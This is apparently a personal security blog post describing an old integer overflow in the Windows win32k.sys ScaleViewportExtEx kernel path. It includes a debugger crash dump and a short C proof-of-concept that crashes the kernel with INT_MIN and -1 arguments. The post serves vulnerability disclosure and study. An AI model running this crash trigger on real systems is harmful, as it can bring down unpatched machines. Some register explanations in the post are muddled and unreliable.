---
layout: post
title:  "Microsoft Windows Kernel - Win32k.sys Integer Overflow"
date:   2018-09-19 03:39:03 +0700
tags:
    - kernel
    - win32k
---

Description
-----------
Few years back I found an integer overflow in kernel (win32k.sys), should be around 2013. It was inspiration to Taviso's blog 
(he was targeting different API, https://gist.github.com/taviso/4658638). AFAIK, this bug has been fixed few months after I discovered 
it. The vulnerability could be reported by someone before me.

Vulnerability Analysis
----------------------
The bug actually was part of **Coordinate Spaces & Transformations** API. Example used of coordinate spaces & transformations,
 ```
  - Scale
  - Rotate
  - Translate
  - Shear
  - Reflect Graphics output
```
This is like we can see daily if used computer. **Coordinate Spaces** act as planar space that locates 2-dimensional objects, example: client area, desktop, page of printer paper. While **Transformations** is a algorithm alters size, orientation and shape of objects, example: Screen, printer. In Taviso blog, he found that the API **ScaleWindowExtEx** was vulnerable to integer overflow. 

I found the similar issue on the API **ScaleViewportExtEx**. The **ScaleViewportExtEx** function modifies the viewport for a device context 
using the ratios formed by the specified multiplicands and divisors. The syntax as in:
```
BOOL ScaleViewportExtEx(
  HDC    hdc,
  int    xn,
  int    dx,
  int    yn,
  int    yd,
  LPSIZE lpsz
);
```

It appears that there is no further checking after dividing the value. It does not recognize the pattern of **Positive** or **Negative** 
numbers. Signed divide **EDX:EAX** by **[ebp+Xdenom]**, with result stored as:

  ```EAX = High-Level Address, EDX = Integer Overflow```

A little trivia about integer overflow,
```
  - Sign of the remainder is always the same as the sign of the dividend.
  - The absolute value of the remainder is always less than the absolute value of the divisor. 
  - Overflow is indicated with the #DE (divide error) exception rather than with the OF (overflow) flag.
```
Crash triage upon run our executable
```
ErrCode = 00000000
eax=80000000 ebx=00000001 ecx=00340910 edx=ffffffff esi=e13ce008 edi=00000000
eip=bf941b8d esp=f671cd10 ebp=f671cd44 iopl=0         ov up ei ng nz na pe cy
cs=0008  ss=0010  ds=0023  es=0023  fs=0030  gs=0000             efl=00010286
win32k!NtGdiScaleViewPortExtEx+0x99:
bf941b8d f77d10          idiv    eax,dword ptr [ebp+10h] ss:0010:f671cd54=ffffffff
```

Crafted Proof-of-Concept as in following:
```
#include <windows.h>
#include <stdio.h>

int main(int argc, char **argv)
{
	LoadLibraryA("user32.dll");
	LoadLibraryA("gdi32.dll");
	
	HDC		dev_context;
	SIZE	Size;
	
	dev_context = CreateCompatibleDC(NULL);
	SetLayout(dev_context, LAYOUT_RTL);
	
	ScaleViewportExtEx(dev_context, INT_MIN, -1, -1, -1, &Size);
	
	return 0;
}
```
